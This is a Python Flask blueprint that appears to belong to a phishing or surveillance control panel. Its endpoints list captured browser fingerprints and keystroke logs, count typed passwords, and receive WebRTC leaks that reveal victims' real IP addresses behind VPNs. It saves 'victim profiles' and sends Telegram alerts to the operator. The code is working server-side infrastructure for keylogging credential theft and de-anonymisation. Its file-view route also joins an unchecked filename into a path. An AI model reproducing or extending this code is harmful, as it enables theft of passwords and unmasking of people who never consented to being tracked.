"""intel blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

import platform
from telegram_bot import telegram_bot
bp = Blueprint("intel", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/fingerprints/list')
def list_fingerprints():
    """List all captured fingerprints with details"""
    try:
        fp_dir = os.path.join(BASE_DIR, 'fingerprints')
        os.makedirs(fp_dir, exist_ok=True)
        
        fingerprints = []
        for f in sorted(os.listdir(fp_dir), reverse=True):
            if f.endswith('.json'):
                filepath = os.path.join(fp_dir, f)
                with open(filepath, 'r') as fh:
                    data = json.load(fh)
                    fingerprints.append({
                        'filename': f,
                        'hash': data.get('hash', 'unknown'),
                        'timestamp': os.path.getmtime(filepath),
                        'browser': data.get('basic', {}).get('userAgent', 'Unknown')[:80],
                        'screen': f"{data.get('basic', {}).get('screenWidth', '?')}x{data.get('basic', {}).get('screenHeight', '?')}",
                        'platform': data.get('basic', {}).get('platform', 'Unknown'),
                    })
        
        return jsonify({'fingerprints': fingerprints})
    except Exception as e:
        return jsonify({'error': str(e), 'fingerprints': []}), 500

@bp.route('/api/keystrokes/list')
def list_keystrokes():
    """List all captured keystroke logs"""
    try:
        ks_dir = os.path.join(BASE_DIR, 'keystrokes')
        os.makedirs(ks_dir, exist_ok=True)
        
        keystroke_files = []
        for f in sorted(os.listdir(ks_dir), reverse=True):
            if f.endswith('.json'):
                filepath = os.path.join(ks_dir, f)
                with open(filepath, 'r') as fh:
                    data = json.load(fh)
                    logs = data.get('logs', [])
                    keystroke_files.append({
                        'filename': f,
                        'timestamp': os.path.getmtime(filepath),
                        'count': len(logs),
                        'passwords': sum(1 for l in logs if l.get('target', {}).get('type') == 'password'),
                        'url': data.get('url', 'Unknown'),
                    })
        
        return jsonify({'keystrokes': keystroke_files})
    except Exception as e:
        return jsonify({'error': str(e), 'keystrokes': []}), 500

@bp.route('/api/keystrokes/view/<filename>')
def view_keystroke_file(filename):
    """View a specific keystroke log file"""
    try:
        filepath = os.path.join(BASE_DIR, 'keystrokes', filename)
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return jsonify(json.load(f))
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/webrtc_leak', methods=['POST'])
def webrtc_leak():
    """Receive real IP address from WebRTC STUN leak"""
    try:
        data = request.json
        leak = {
            'real_ip': data.get('real_ip', data.get('ip', '')),
            'visible_ip': request.remote_addr,
            'user_agent': data.get('user_agent', ''),
            'platform': data.get('platform', ''),
            'timestamp': datetime.now().isoformat(),
            'vpn_detected': data.get('real_ip', '') != request.remote_addr,
        }
        WEBRTC_LEAKS.append(leak)
        if len(WEBRTC_LEAKS) > 500:
            WEBRTC_LEAKS.pop(0)
        
        # Auto-update victim profile
        if leak['real_ip']:
            db.save_victim_profile(ip=leak['real_ip'], user_agent=leak.get('user_agent', ''))
        
        track_event('webrtc_leak', leak, request.remote_addr)
        
        # Telegram alert if VPN detected
        if leak['vpn_detected']:
            telegram_bot.alert_credential('webrtc_leak', f"Real: {leak['real_ip']} | Visible: {leak['visible_ip']}", 'WebRTC STUN')
        
        return jsonify({'status': 'received'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
